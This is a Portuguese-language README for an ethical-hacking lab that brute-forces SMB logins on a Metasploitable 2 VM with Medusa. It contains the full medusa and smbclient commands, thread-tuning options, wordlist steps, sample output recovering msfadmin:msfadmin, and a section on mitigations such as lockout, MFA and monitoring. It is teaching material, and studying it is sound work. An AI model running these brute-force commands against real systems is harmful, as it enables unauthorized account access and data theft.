# 🔐 Medusa SMB Brute Force Attack Lab

> **Laboratório de Ethical Hacking**: Demonstração prática de ataque de força bruta paralelo contra serviços SMB usando Medusa

[![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-557C94?style=flat&logo=kali-linux)](https://www.kali.org/)
[![Metasploitable](https://img.shields.io/badge/Target-Metasploitable_2-E34F26?style=flat)](https://sourceforge.net/projects/metasploitable/)
[![License](https://img.shields.io/badge/License-Educational-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-Pentesting-red.svg)](https://github.com)

---

## ⚠️ AVISO LEGAL

**Este repositório é exclusivamente para fins educacionais e de pesquisa em segurança da informação.**

- ✅ Use apenas em ambientes controlados (laboratórios, VMs pessoais)
- ✅ Obtenha autorização por escrito antes de qualquer teste
- ❌ **O uso não autorizado é ILEGAL** e passível de punição criminal
- ❌ Nunca execute estes scripts em sistemas de produção ou sem permissão

O autor não se responsabiliza por uso indevido ou atividades ilegais realizadas com este material.

---

## 📋 Índice

- [Sobre o Projeto](#sobre-o-projeto)
- [Conceitos Técnicos](#conceitos-técnicos)
- [Requisitos](#requisitos)
- [Instalação](#instalação)
- [Estrutura do Repositório](#estrutura-do-repositório)
- [Guia Passo a Passo](#guia-passo-a-passo)
- [Resultados Esperados](#resultados-esperados)
- [Mitigações e Boas Práticas](#mitigações-e-boas-práticas)
- [Troubleshooting](#troubleshooting)
- [Contribuindo](#contribuindo)
- [Referências](#referências)

---

## 🎯 Sobre o Projeto

Este laboratório demonstra como vulnerabilidades em sistemas mal configurados podem ser exploradas através de ataques de força bruta automatizados. O foco está em:

- **Exploração de credenciais fracas/padrão** em serviços de rede
- **Uso do Medusa** para ataques paralelos de força bruta
- **Validação de acesso** através do protocolo SMB
- **Conscientização sobre segurança** da informação

### 🎓 Objetivo Educacional

Compreender as falhas de segurança causadas por:
- Senhas fracas ou previsíveis
- Credenciais padrão não alteradas
- Falta de políticas de bloqueio de conta
- Ausência de monitoramento de tentativas de login

---

## 🧠 Conceitos Técnicos

### O que é Força Bruta?

Ataque de força bruta é uma técnica que consiste em **testar sistematicamente todas as combinações possíveis** de credenciais até encontrar a correta. O processo segue a lógica:

```
Para cada USUÁRIO na lista:
    Para cada SENHA na lista:
        Tentar autenticação com (USUÁRIO, SENHA)
        Se sucesso:
            Registrar credencial válida
            [Opcional] Parar execução
```

### Força Bruta Paralela (Medusa)

Diferente de ferramentas sequenciais, o **Medusa** implementa:

- ✨ **Múltiplas threads simultâneas**: testa várias combinações ao mesmo tempo
- ⚡ **Velocidade otimizada**: reduz drasticamente o tempo de ataque
- 🎯 **Suporte a múltiplos protocolos**: SSH, FTP, SMB, HTTP, etc.
- 🛑 **Stop-on-success**: pode parar ao encontrar primeira credencial válida

### Protocolo SMB (Server Message Block)

SMB é um protocolo de compartilhamento de arquivos e recursos em rede, comumente usado em:
- Sistemas Windows
- Servidores Samba (Linux)
- Dispositivos NAS

**Portas padrão**: 139 (NetBIOS), 445 (SMB direto)

---

## 📦 Requisitos

### Hardware

- **RAM**: Mínimo 4GB (recomendado 8GB)
- **Processador**: Dual-core ou superior
- **Disco**: 20GB livres

### Software

| Ferramenta | Versão | Descrição |
|------------|--------|-----------|
| **Kali Linux** | 2024.x | Sistema operacional para pentesting |
| **VirtualBox/VMware** | Última | Virtualização para laboratório isolado |
| **Metasploitable 2** | 2.0.0 | VM vulnerável (alvo do ataque) |
| **Medusa** | 2.2+ | Ferramenta de força bruta paralela |
| **smbclient** | 4.x | Cliente SMB para validação |

### Configuração de Rede

Configure suas VMs com **Host-Only Adapter** para isolamento:

```
Kali Linux:     192.168.56.1/24
Metasploitable: 192.168.56.101/24
```

---

## 🚀 Instalação

### 1. Clonar o Repositório

```bash
git clone https://github.com/seu-usuario/medusa-smb-attack.git
cd medusa-smb-attack
```

### 2. Instalar Dependências

No Kali Linux:

```bash
sudo apt update
sudo apt install medusa smbclient nmap -y
```

Verificar instalação:

```bash
medusa -V
smbclient --version
```

### 3. Configurar Permissões

Tornar scripts executáveis:

```bash
chmod +x scripts/*.sh
```

### 4. Ajustar Configurações

Edite o arquivo `config.conf` e ajuste o IP do alvo:

```bash
nano config.conf
```

Altere a linha:
```
TARGET_IP=192.168.56.101  # Substitua pelo IP da sua VM Metasploitable
```

---

## 📁 Estrutura do Repositório

```
medusa-smb-attack/
│
├── wordlists/                  # Listas de alvos para força bruta
│   ├── usuarios.txt            # Lista de usuários comuns
│   └── senhas.txt              # Lista de senhas fracas
│
├── scripts/                    # Scripts automatizados
│   ├── preparar_wordlists.sh   # Gera wordlists automaticamente
│   ├── ataque_medusa.sh        # Executa o ataque principal
│   └── validar_acesso.sh       # Valida credenciais descobertas
│
├── config.conf                 # Arquivo de configurações
├── README.md                   # Documentação completa (este arquivo)
└── LICENSE                     # Licença do projeto
```

### Descrição dos Arquivos

#### 📄 `wordlists/usuarios.txt`
Lista de nomes de usuário comumente usados em sistemas vulneráveis:
- admin, root, msfadmin
- Usuários de serviços (postgres, tomcat)
- Contas genéricas (user, guest)

#### 📄 `wordlists/senhas.txt`
Senhas fracas e padrão frequentemente encontradas:
- Senhas numéricas simples (123456, 12345678)
- Palavras comuns (password, admin)
- Credenciais padrão de sistemas (msfadmin)

#### 🔧 `scripts/preparar_wordlists.sh`
Script auxiliar que recria as wordlists caso sejam modificadas ou deletadas.

#### ⚔️ `scripts/ataque_medusa.sh`
Script principal que:
- Valida pré-requisitos
- Exibe informações do ataque
- Executa o Medusa com as configurações otimizadas
- Para ao encontrar primeira credencial válida

#### ✅ `scripts/validar_acesso.sh`
Script de validação que:
- Testa credenciais descobertas
- Lista compartilhamentos SMB disponíveis
- Confirma se o acesso foi bem-sucedido

#### ⚙️ `config.conf`
Centralize todas as configurações do laboratório:
- IPs e configurações de rede
- Caminhos de wordlists
- Parâmetros do Medusa (threads, timeout)
- Configurações de logging

---

## 📖 Guia Passo a Passo

### Passo 1: Preparar o Ambiente

#### 1.1 Iniciar Metasploitable 2

```bash
# Inicie sua VM Metasploitable 2
# Login padrão: msfadmin / msfadmin
# Verifique o IP:
ifconfig
```

#### 1.2 Verificar Conectividade

No Kali Linux:

```bash
# Teste de ping
ping -c 4 192.168.56.101

# Scan de portas SMB
nmap -p 139,445 192.168.56.101
```

Saída esperada:
```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

---

### Passo 2: Preparar Wordlists

#### Opção A: Usar as Wordlists Prontas

As wordlists já estão prontas em `wordlists/`. Visualize-as:

```bash
cat wordlists/usuarios.txt
cat wordlists/senhas.txt
```

#### Opção B: Recriar Wordlists com Script

```bash
cd scripts/
./preparar_wordlists.sh
```

**Output esperado:**
```
[*] Preparando wordlists para ataque de força bruta...
[+] Wordlists criadas com sucesso!
[+] Arquivo: ../wordlists/usuarios.txt (10 usuários)
[+] Arquivo: ../wordlists/senhas.txt (15 senhas)

[!] Total de combinações possíveis: 150
```

#### Opção C: Criar Manualmente

```bash
# Criar lista de usuários
echo -e "admin\nuser\nmsfadmin\nroot" > wordlists/usuarios.txt

# Criar lista de senhas
echo -e "123456\npassword\nadmin\nmsfadmin" > wordlists/senhas.txt
```

---

### Passo 3: Executar o Ataque com Medusa

#### 3.1 Usando o Script Automatizado (Recomendado)

```bash
cd scripts/
./ataque_medusa.sh 192.168.56.101
```

#### 3.2 Comando Manual (Método Direto)

```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -f
```

**Explicação dos Parâmetros:**

| Parâmetro | Descrição |
|-----------|-----------|
| `-h` | IP do host alvo |
| `-U` | Arquivo com lista de usuários |
| `-P` | Arquivo com lista de senhas |
| `-M` | Módulo a ser usado (smbnt = SMB/CIFS) |
| `-f` | Para na primeira credencial válida encontrada |
| `-t` | Número de threads paralelas (padrão: 4) |
| `-v` | Modo verbose (mais detalhes no output) |

---

### Passo 4: Interpretar Resultados

Durante a execução, o Medusa exibirá:

```
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: 123456 (1 of 15 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 10, 0 complete) Password: password (2 of 15 complete)
...
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

**Credencial descoberta:** `msfadmin:msfadmin` ✅

---

### Passo 5: Validar o Acesso

#### 5.1 Usando o Script Automatizado

```bash
cd scripts/
./validar_acesso.sh 192.168.56.101 msfadmin msfadmin
```

#### 5.2 Validação Manual

```bash
smbclient -L //192.168.56.101/ -U msfadmin
# Digite a senha quando solicitado: msfadmin
```

**Output esperado:**

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk      
IPC$            IPC       IPC Service (metasploitable server)
ADMIN$          IPC       IPC Service (metasploitable server)
```

✅ **Acesso confirmado!** As credenciais estão válidas.

---

### Passo 6: Acessar Compartilhamento

Com as credenciais validadas, acesse um compartilhamento específico:

```bash
smbclient //192.168.56.101/tmp -U msfadmin
# Digite a senha: msfadmin
```

Comandos dentro do smbclient:
```
smb: \> ls          # Listar arquivos
smb: \> cd pasta/   # Navegar em diretórios
smb: \> get arquivo # Baixar arquivo
smb: \> put arquivo # Enviar arquivo
smb: \> exit        # Sair
```

---

## 🎬 Resultados Esperados

### Screenshot 1: Preparação das Wordlists

```
┌──(kali㉿kali)-[~/medusa-smb-attack]
└─$ cd scripts && ./preparar_wordlists.sh

[*] Preparando wordlists para ataque de força bruta...
[+] Wordlists criadas com sucesso!
[+] Arquivo: ../wordlists/usuarios.txt (10 usuários)
[+] Arquivo: ../wordlists/senhas.txt (15 senhas)

[!] Total de combinações possíveis: 150
```

### Screenshot 2: Execução do Ataque

```
┌──(kali㉿kali)-[~/medusa-smb-attack/scripts]
└─$ ./ataque_medusa.sh 192.168.56.101

╔═══════════════════════════════════════════════╗
║     MEDUSA SMB BRUTE FORCE ATTACK TOOL        ║
║           Ethical Hacking Lab                 ║
╚═══════════════════════════════════════════════╝

[*] Alvo: 192.168.56.101
[*] Protocolo: smbnt
[*] Usuários: 10 entradas
[*] Senhas: 15 entradas
[*] Total de tentativas: 150

[!] Iniciando ataque de força bruta...

ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: admin Password: 123456
ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 User: admin Password: password
...
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

[+] Ataque finalizado!
```

### Screenshot 3: Validação do Acesso

```
┌──(kali㉿kali)-[~/medusa-smb-attack/scripts]
└─$ ./validar_acesso.sh 192.168.56.101 msfadmin msfadmin

[*] Validando credenciais...
[*] Alvo: 192.168.56.101
[*] Usuário: msfadmin

[*] Listando compartilhamentos SMB...

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service
        ADMIN$          IPC       IPC Service

[+] ✓ Credenciais válidas! Acesso confirmado.

[*] Para acessar um compartilhamento específico, use:
    smbclient //192.168.56.101/[COMPARTILHAMENTO] -U msfadmin%msfadmin
```

---

## 🛡️ Mitigações e Boas Práticas

### Vulnerabilidade Explorada

**Credenciais fracas ou padrão não alteradas** permitem que atacantes:
- Ganhem acesso não autorizado ao sistema
- Roubem dados sensíveis
- Instalem malware ou backdoors
- Escalem privilégios

### Recomendações de Segurança

#### 1. 🔐 Políticas de Senhas Fortes

Implemente requisitos mínimos:
- **Comprimento**: mínimo 12 caracteres
- **Complexidade**: letras maiúsculas, minúsculas, números e símbolos
- **Histórico**: não permitir reutilização das últimas 10 senhas
- **Expiração**: forçar troca periódica (ex: a cada 90 dias)

```bash
# Exemplo de senha forte gerada aleatoriamente:
# K7@mN9$pL2xQ&wR4
```

#### 2. 🚫 Bloqueio de Conta (Account Lockout)

Configure políticas para bloquear contas após tentativas falhas:

**Windows:**
```
- Limite de tentativas: 5 falhas
- Duração do bloqueio: 30 minutos
- Reset do contador: após 15 minutos
```

**Linux (PAM):**
```bash
# Adicione em /etc/pam.d/common-auth:
auth required pam_tally2.so deny=5 unlock_time=1800 onerr=fail
```

#### 3. 🔑 Autenticação Multifator (MFA)

Implemente sempre que possível:
- **SMS/Authenticator apps**: Google Authenticator, Microsoft Authenticator
- **Tokens físicos**: YubiKey, hardware tokens
- **Biometria**: impressão digital, reconhecimento facial

#### 4. 📊 Monitoramento e Logging

Configure alertas para detectar ataques:

```bash
# Exemplo: detectar múltiplas falhas de login no Linux
tail -f /var/log/auth.log | grep "Failed password"

# Alerte quando houver 10+ falhas em 1 minuto
```

Ferramentas recomendadas:
- **Fail2Ban**: bloqueio automático de IPs maliciosos
- **OSSEC/Wazuh**: SIEM para análise de logs
- **Splunk**: plataforma de análise de segurança

#### 5. 🔒 Segmentação de Rede

Isole serviços críticos:
- Use **VLANs** para separar ambientes
- Implemente **firewalls** entre segmentos
- Restrinja acesso SMB apenas a redes internas

```bash
# Exemplo de firewall (iptables):
iptables -A INPUT -p tcp --dport 445 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 445 -j DROP
```

#### 6. 🔄 Alteração de Credenciais Padrão

**NUNCA use credenciais padrão em produção:**

| Sistema | Usuário Padrão | Ação Recomendada |
|---------|----------------|------------------|
| Roteadores | admin/admin | Alterar imediatamente |
| Bancos de dados | root/[vazio] | Definir senha forte |
| Aplicações | admin/password | Forçar troca no primeiro login |

#### 7. 🕵️ Auditoria Regular

Realize verificações periódicas:
- **Análise de contas**: remova contas inativas
- **Revisão de permissões**: princípio do menor privilégio
- **Testes de penetração**: contrate pentesters ou use ferramentas automatizadas

---

## 🐛 Troubleshooting

### Problema: "Medusa not found"

**Solução:**
```bash
sudo apt update
sudo apt install medusa -y
```

### Problema: "Connection refused" ou "Host unreachable"

**Possíveis causas:**
1. IP incorreto
2. VM não está rodando
3. Configuração de rede errada

**Diagnóstico:**
```bash
# Testar conectividade
ping 192.168.56.101

# Verificar portas abertas
nmap -p 139,445 192.168.56.101

# Verificar configuração de rede
ip addr show
```

### Problema: "No valid credentials found"

**Possíveis causas:**
1. Wordlists insuficientes
2. Alvo já possui proteções
3. Protocolo ou porta incorretos

**Solução:**
```bash
# Expandir wordlists com mais entradas
# Ou usar wordlists públicas maiores:
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O wordlists/senhas_grandes.txt
```

### Problema: Ataque muito lento

**Otimizações:**
```bash
# Aumentar número de threads (cuidado: mais agressivo)
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt -t 10

# Reduzir timeout
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt -T 1
```

### Problema: "Permission denied" ao executar scripts

**Solução:**
```bash
chmod +x scripts/*.sh
```

---

## 🤝 Contribuindo

Contribuições são bem-vindas! Para contribuir:

1. **Fork** o repositório
2. Crie uma **branch** para sua feature (`git checkout -b feature/MinhaFeature`)
3. **Commit** suas mudanças (`git commit -m 'Adiciona MinhaFeature'`)
4. **Push** para a branch (`git push origin feature/MinhaFeature`)
5. Abra um **Pull Request**

### Ideias para Contribuições

- 📝 Adicionar suporte a outros protocolos (SSH, FTP, HTTP)
- 🎨 Melhorar interface dos scripts
- 📊 Implementar geração automática de relatórios
- 🌐 Adicionar internacionalização (i18n)
- 🧪 Criar testes automatizados

---

## 📚 Referências

### Ferramentas

- [Medusa - Official Documentation](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Kali Linux](https://www.kali.org/)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)

### Documentação Técnica

- [SMB Protocol Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/)
- [OWASP - Brute Force Attacks](https://owasp.org/www-community/attacks/Brute_force_attack)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

### Estudos e Artigos

- [Common Vulnerabilities in SMB](https://www.cisa.gov/news-events/alerts/2017/01/16/smb-security-best-practices)
- [MITRE ATT&CK - Brute Force](https://attack.mitre.org/techniques/T1110/)

### Cursos Recomendados

- [Offensive Security Certified Professional (OSCP)](https://www.offensive-security.com/pwk-oscp/)
- [EC-Council Certified Ethical Hacker (CEH)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)

---

## 📞 Contato

**Desenvolvido para fins educacionais**

- 💼 LinkedIn: [[ptrcosta](https://www.linkedin.com/in/ptrcosta/)]
- 🐙 GitHub: [@3S00mc](https://github.com/3S00mc)
- 📧 Email: ptrcosta@proton.me

---

## 📄 Licença

Este projeto está sob a licença **MIT** - veja o arquivo [LICENSE](LICENSE) para detalhes.

**Uso Educacional**: Este material pode ser utilizado livremente para fins acadêmicos e educacionais, desde que respeitadas as leis locais e internacionais sobre segurança da informação.

---

## 🙏 Agradecimentos

- Comunidade Kali Linux
- Rapid7 (criadores do Metasploitable)
- Desenvolvedores do Medusa
- Comunidade de Ethical Hacking

---

<div align="center">

**⚠️ Use com Responsabilidade | 🎓 Aprenda Ética | 🔐 Proteja Sistemas**

*"Com grandes poderes vêm grandes responsabilidades"*

Made with ❤️ for Cybersecurity Education

</div>
